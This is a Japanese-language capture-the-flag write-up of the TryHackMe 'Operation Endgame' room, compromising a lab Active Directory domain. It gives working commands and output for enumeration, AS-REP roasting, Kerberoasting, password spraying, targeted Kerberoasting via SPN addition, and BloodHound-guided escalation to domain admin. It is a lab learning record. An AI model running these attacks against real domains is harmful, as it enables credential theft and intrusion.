# Operation Endgame CTF

https://tryhackme.com/room/operationendgame

## Enumeration

```shell
TARGET=10.49.178.48
sudo bash -c "echo $TARGET   oe.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
80/tcp    open  http             syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
443/tcp   open  https            syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
3389/tcp  open  ms-wbt-server    syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
47001/tcp open  winrm            syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
49665/tcp open  unknown          syn-ack ttl 128
49666/tcp open  unknown          syn-ack ttl 128
49667/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49671/tcp open  unknown          syn-ack ttl 128
49675/tcp open  unknown          syn-ack ttl 128
49676/tcp open  unknown          syn-ack ttl 128
49681/tcp open  unknown          syn-ack ttl 128
49687/tcp open  unknown          syn-ack ttl 128
49703/tcp open  unknown          syn-ack ttl 128
49709/tcp open  unknown          syn-ack ttl 128
49761/tcp open  unknown          syn-ack ttl 128
```

```sh
sudo nmap -sV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,9389,47001,49664,49665,49666,49667,49669,49670,49671,49675,49676,49681,49687,49703,49709,49761 $TARGET

PORT      STATE SERVICE           VERSION
53/tcp    open  domain?
80/tcp    open  http              Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-02-28 01:41:54Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http          Microsoft IIS httpd 10.0
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
9389/tcp  open  mc-nmf            .NET Message Framing
47001/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc             Microsoft Windows RPC
49665/tcp open  msrpc             Microsoft Windows RPC
49666/tcp open  msrpc             Microsoft Windows RPC
49667/tcp open  msrpc             Microsoft Windows RPC
49669/tcp open  msrpc             Microsoft Windows RPC
49670/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  msrpc             Microsoft Windows RPC
49676/tcp open  msrpc             Microsoft Windows RPC
49681/tcp open  msrpc             Microsoft Windows RPC
49687/tcp open  msrpc             Microsoft Windows RPC
49703/tcp open  msrpc             Microsoft Windows RPC
49709/tcp open  msrpc             Microsoft Windows RPC
49761/tcp open  msrpc             Microsoft Windows RPC
```

```sh
root@ip-10-48-82-253:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.183.95
+ Target Hostname:    oe.thm
+ Target Port:        80
+ Start Time:         2026-02-28 01:47:55 (GMT0)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Retrieved x-powered-by header: ASP.NET
+ Server leaks inodes via ETags, header found with file /, fields: 0x8513a029a484d91:0 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server banner has changed from 'Microsoft-IIS/10.0' to 'Microsoft-HTTPAPI/2.0' which may suggest a WAF, load balancer or proxy is in place
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ 1707 items checked: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2026-02-28 01:47:58 (GMT0) (3 seconds)
---------------------------------------------------------------------------
```

### SMB, NFS, LDAP

```sh
enum4linux-ng -A $TARGET -oA results.txt

 ===========================================================
|    Domain Information via SMB session for 10.48.183.95    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: AD
NetBIOS domain name: THM
DNS domain: thm.local
FQDN: ad.thm.local
Derived membership: domain member
Derived domain: THM

 ===============================================
|    OS Information via RPC for 10.48.183.95    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null
```

有用そうな共有ディレクトリは無い。

```sh
smbclient -L //$TARGET -U ""

root@ip-10-48-82-253:~# smbclient -L //$TARGET -U ""
Password for [WORKGROUP\]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share
```

ユーザー列挙

```sh
$ lookupsid.py thm.local/guest@$TARGET
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.48.183.95
[*] StringBinding ncacn_np:10.48.183.95[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1966530601-3185510712-10604624
498: THM\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: THM\Administrator (SidTypeUser)
...
1008: THM\AD$ (SidTypeUser)
1109: THM\DnsAdmins (SidTypeAlias)
1110: THM\DnsUpdateProxy (SidTypeGroup)
1114: THM\SHANA_FITZGERALD (SidTypeUser)
1115: THM\CAREY_FIELDS (SidTypeUser)
1116: THM\DWAYNE_NGUYEN (SidTypeUser)
...
以降多数
```

## kerberos

AS-REP Roasting はハッシュが5人出てきたが、パスワードは判明しなかった。

```sh
nxc ldap $TARGET -u User.txt -p '' --asreproast as-rep.txt
```

ユーザー名とパスワードが同じパターン全滅

```sh
crackmapexec smb $TARGET -u ./User.txt -p ./User.txt --no-bruteforce
```

ユーザー名とfasttrackの組み合わせ全滅

```sh
root@ip-10-49-127-244:~# kerbrute bruteforce -d thm.local --dc $TARGET ./combo_list.txt

2026/02/28 07:58:20 >  Done! Tested 128412 logins (0 successes) in 848.312 seconds
```

guestによるKerberoasting。CODY_ROYのパスワード判明。

```sh
$ nxc ldap ad.thm.local -u 'guest' -p '' --kerberoasting kerberoastables.txt
SMB         10.49.168.98    445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:False)
LDAP        10.49.168.98    389    AD               [+] thm.local\guest: 
LDAP        10.49.168.98    389    AD               [*] Total of records returned 1
LDAP        10.49.168.98    389    AD               sAMAccountName: CODY_ROY memberOf: CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local pwdLastSet: 2024-05-10 23:06:07.611965 lastLogon:2024-04-25 00:41:18.970113                 
LDAP        10.49.168.98    389    AD               $krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local/CODY_ROY*$abaaee5f[REDACTED]
```

RDP認証できる。・・・が、Restrictionで拒否される。→　後から気付いたが、間違えてRemminaのRestrictモードをONにしていたのが原因と思われる。

```sh
$ nxc rdp $TARGET -u 'CODY_ROY' -p '[REDACTED]' 
RDP         10.49.168.98    3389   AD               [*] Windows 10 or Windows Server 2016 Build 17763 (name:AD) (domain:thm.local) (nla:True)
RDP         10.49.168.98    3389   AD               [+] thm.local\CODY_ROY:[REDACTED] (Pwn3d!)
```

bloodhound を実行したところ、下記のグラフ。

```
CODY_ROY MemberOf REPLICATOR@THM.CORP
REPLICATOR@THM.CORP GenericAll DOMAIN GUESTS@THM.LOCAL
DOMAIN GUESTS@THM.LOCAL MemberOf GUESTS@THM.LOCAL
GUESTS@THM.LOCAL GenericWrite ROBERTO_MORIN@THM.LOCAL
ROBERTO_MORIN@THM.LOCAL MemberOf DOMAIN ADMINS@THM.LOCAL
DOMAIN ADMINS@THM.LOCAL GenericWrite ADMINISTRATOR@THM.LOCAL
```

下記のステップを想定。

1. CODY_ROY を DOMAIN GUESTS@THM.LOCAL グループに追加
2. ROBERTO_MORIN@THM.LOCAL の認証を得る（パスワードを変えるとか）
3. ADMINISTRATOR@THM.LOCAL の認証を得る

グループに入れようとしたが、権限不足エラーとなった。

```sh
$ bloodyAD -u 'CODY_ROY' -p '[REDACTED]' -d 'thm.local' --host $TARGET add groupMember 'DOMAIN GUESTS' 'CODY_ROY'
Traceback (most recent call last):
  File "/home/kali/.local/bin/bloodyAD", line 10, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/kali/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
  File "/home/kali/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 390, in groupMember                                                                                                 
    conn.ldap.bloodymodify(group, {"member": [(Change.ADD.value, member_transformed)]})
    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 302, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=Domain Guests,CN=Users,DC=thm,DC=local! Result code: "insufficientAccessRights" Reason: "b'00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00'"
```

エッジ詳細をみるとACL継承していることが分かり、こういう場合にbloodhoundの推論が誤ることはよくあるとのこと。

```
Is ACL: TRUE
Is Inherited: TRUE
```

同じパスワードでパスワードスプレーを実行。ZACHARY_HUNT も同じパスワードを使っていることが判明。

```sh
$ nxc smb $TARGET -u User.txt -p '[REDACTED]' --continue-on-success

...
SMB         10.49.179.41    445    AD               [+] thm.local\ZACHARY_HUNT:[REDACTED] 
...
```

ZACHARY_HUNT から Administrator へ至るパスは無かった。

下記のパスはある。READER ADMINSで何ができるのかは不明。SMB共有でC$を読めたりする可能性はある。

```
GenericWrite JERRI_LANCASTER@THM.LOCAL 
MemberOf READER ADMINS@THM.LOCAL
```

JERRI_LANCASTER に対してパスワード変更はできなかった。  
WriteProperties のACLはある。

```
[*]   ACE[7] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadControl, WriteProperties, ReadProperties, Self, ListChildObjects (0x2003c)
[*]     Trustee (SID)             : ZACHARY_HUNT (S-1-5-21-1966530601-3185510712-10604624-1423)
...
```

SPNを追加。

```sh
$ addspn -u 'thm.local\ZACHARY_HUNT' -p '[REDACTED]' \
-d thm.local \
--target 'JERRI_LANCASTER' \
--spn fake/http \
$TARGET
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

この後ケルベロースティングを実行して、パスワード判明。

C$ が読めるわけではなかった。

```sh
$ smbclient //$TARGET/C$ -U 'thm.local\JERRI_LANCASTER' 
Password for [THM.LOCAL\JERRI_LANCASTER]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

RDPに接続できた。操作が非常に制限されていて、コマンドプロンプトを開くのに非常に苦労した。  
（何をどうやったのか思い出せないが、画面右下あたりを操作していた気がする）

C:\Scripts に入っているスクリプトを読むと、 SANFORD_DAUGHERTY ユーザーのリセットパスワードが出ていた。  
そのパスワードでパスワードスプレーをかけたが、そのユーザーだけだった。

bloodhound を見ると、 SANFORD_DAUGHERTY はドメイン管理者だった。

SANFORD_DAUGHERTY として RDPでログインしたが、Administratorフォルダには入れなかった。  
（今回はタスクマネージャを開けたのでそこからcmdを起動した）

タスクマネージャからcmdを開くとき、管理者として実行のチェックボックスがあった。  
Administratorのデスクトップでフラグを発見。

## 振り返り

- このチャレンジを通して、Kerberos と bloodhound に関する知識がかなり深まった。
- guest + ブランクパスワードによるKerberoasting は初見。
- 標的型Kerberoastingは初見。目から鱗。
- bloodhound の GenericWrite は過信禁物。
- AD環境はブルートフォースよりパスワードスプレー。

## Tags

#tags:Windows #tags:Kerberos #tags:bloodhound
